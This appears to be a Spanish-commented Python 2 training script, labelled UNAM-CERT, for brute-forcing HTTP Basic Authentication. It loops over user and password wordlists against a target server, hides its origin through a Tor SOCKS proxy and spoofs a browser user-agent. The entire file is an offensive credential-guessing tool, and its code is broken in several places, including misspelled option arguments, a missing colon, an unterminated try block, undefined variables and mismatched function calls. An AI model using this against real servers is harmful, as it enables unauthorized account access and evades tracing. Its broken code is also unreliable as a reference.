#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError


listpass=[]
listuser=[]
headers = {}


    

def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-L', '--listuser', dest='users', default=None,help='archivo con users')
    parser.add_option('-C', '--listpass', dest='passwords',default=None,help='archivo con passwds')
    parser.add_option('-a', '--agente' , accion= 'store_true',dest= 'agente', default=False, help = 'cmbio de agente')
    parser.add_option('-t', '--tor', accion='store_rue', dest='tor', default=False,help='request anonimo')
    parser.add_option('v',  '--verbose', accion='store_true', dest='verbose',default=False, help='modo verboso')
    parser.add_option('r',  '--report', dest='report',default=None, help= 'archivo generado')
    opts,args = parser.parse_args()
    return opts
   


def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)
    if options.user is None:
        printError('Desbes especificar un usuario ', True)
    if options.users is None:
        printError('debes especificar ',True)
    if options.password is None:
        printError('Desbes especificar un pass ',True)

def reportResults():
    pass


def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url


def makeRequest(host, user, password):
    try:

	response = get(host, auth=(user,password))
	#print response
	#print dir(response)
	if response.status_code == 200:
	    print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
	else:
	    print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)


def ActiveTor(t,v,a):
    try : 
         if t :
                session = requests.session()
                session.proxies = {}
                session.proxies['http'] = 'socks5h://127.0.0.1:9050'
                session.proxies['https'] = 'socks5h://127.0.0.1:9050'
                if a:
                        headers={}
                        headers['user-agent']='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'
                        response = session.get(host, headers=headers)
                else:

                     response=sesion.get(host)

   # socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS,"127.0.0.1",9050,True)
    #socks.socket = socks.socksocket
    #print (requests.get ("84.19.176.42")).content
      #with controller.from_port(port = 9050)as controller:
       # controller.authenticate()
def lee_archivo (host,user,password,a,t,v,r)
        if v:
            print 'leyendo archivo'
        with open (user,'r')as users , open (passwords, 'r')as contra:
            usrs = usrs.read()
            passwrd=passwrd.read()
            resultado = False
            for u in usrs.splitlines():
                if resultado == True:
                    break
                else:
                     for p in passwds.splitlines():
                        resultado=makeRequest(host,a,t,u,p,v,r)

if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, opts.verbose ,port = opts.port)
        if opts.users: 
                lee_archivo(opts.tor,
                            opts.agente,
                            opts.user,
                            opts.password,
                            opts.report)
        makeRequest(url, opts.user, opts.password)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
